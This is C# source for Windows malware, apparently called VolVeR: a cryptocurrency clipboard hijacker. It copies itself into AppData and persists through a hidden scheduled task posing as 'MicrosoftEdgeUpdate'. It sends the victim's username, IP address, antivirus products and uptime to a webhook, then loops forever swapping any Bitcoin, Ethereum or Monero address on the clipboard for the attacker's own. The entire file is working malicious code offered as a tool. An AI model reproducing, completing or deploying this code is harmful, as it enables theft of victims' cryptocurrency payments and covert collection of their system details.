using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Security.Principal;
using System.Security.Claims;
using System.Net;
using System.Management;
using System.Collections.Specialized;


namespace VolVeR
{
    class Program
    {

        static string folder = Environment.GetEnvironmentVariable("AppData") + "\\PathWW";  
        static string file = "dpwwr" + ".exe";
        static string TGMarkerPath = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WindowsUpdate"), "updatelog");
        static string markerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WindowsUpdate");
        static string DiscNotifications = "tlgnotf";


        [STAThread]
        static void Main(string[] args)
        {
            try
            {



                if (!Directory.Exists(folder))
                    Directory.CreateDirectory(folder);

                if (!File.Exists(folder + "\\" + file))
                    File.Copy(Assembly.GetEntryAssembly().Location, folder + "\\" + file);



            }
            catch
            {

            }

            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    CreateNoWindow = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = @"/create /sc MINUTE /mo 3 /tn ""MicrosoftEdgeUpdate"" /tr """ + folder + "\\" + file + @""" /f"
                };
                Process.Start(startInfo);
            }
            catch { }


           
            string myText = Program.GrabInformation();



                if (DiscNotifications == "true")
                {
                try
                {
                    if (!File.Exists(TGMarkerPath))
                    {
                        Program.sendToHook("dischoock", myText, "VOLVER");
                        if (!Directory.Exists(markerPath))
                            Directory.CreateDirectory(markerPath);
                        File.WriteAllText(TGMarkerPath, "");
                    }
                }
                catch  { }

                }


            while (true)
            {

                string BTC = "btc";
                string ETH = "eth";
                string XMR = "xmr";
 

                try
                {

                    string buffer = Clipboard.GetText();

               
                if (buffer.Contains("0x") && buffer != ETH)
                    Clipboard.SetText(ETH);
                Thread.Sleep(150);

                if (new Regex("^3[a-km-zA-HJ-NP-Z1-9]{25,34}$+").IsMatch(buffer))
                    Clipboard.SetText(BTC);
                Thread.Sleep(150);

                if (new Regex("^(bc1|[13])[a-zA-HJ-NP-Z0-9]+").IsMatch(buffer))
                    Clipboard.SetText(BTC);
                Thread.Sleep(150);

                

                    if (new Regex("(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)").IsMatch(buffer))
                Clipboard.SetText(XMR);
                Thread.Sleep(150);
                }
                catch (Exception)
                {
                    
                }



            }

 

        }

        internal static string GrabInformation()
        {
            string str1 = "N/A";
            string str5 = "N/A";
            string str6 = "N/A";
            string str7 = "N/A";

            str1 = ((ClaimsIdentity)WindowsIdentity.GetCurrent()).Name;
            str5 = Program.UpTime.ToString();
            try
            {
                str6 = new WebClient().DownloadString("https://api.ipify.org");

            }
            catch (Exception)
            {
                str6 = "N/A";
            }

            {
                str7 = "";
                foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get())
                    str7 = str7 + managementObject["displayName"].ToString() + "; ";
            }

            return string.Format(" ``` User {0} has joined!  \r\n   \r\n Anti-Virus: {2} \r\n \r\n System Online: {3} \r\n \r\nIP Address: {1} \r\n \r\n https://t.me/VolVeRFM ```", (object)str1, (object)str6, (object)str7, (object)str5);


        }
        public static TimeSpan UpTime
        {
            get
            {
                using (PerformanceCounter performanceCounter = new PerformanceCounter("System", "System Up Time"))
                {
                    double num = (double)performanceCounter.NextValue();
                    return TimeSpan.FromSeconds((double)performanceCounter.NextValue());
                }
            }
        }

        public static byte[] Post(string url, NameValueCollection pairs)
        {
            using (WebClient webClient = new WebClient())
                return webClient.UploadValues(url, pairs);
        }

        public static void sendToHook(string url, string msg, string username)
        {
            Program.Post(url, new NameValueCollection()
            {

     {
        "username",
        username
      },
      {
        "content",
        msg
      }

            });


        }

    }
}
 
    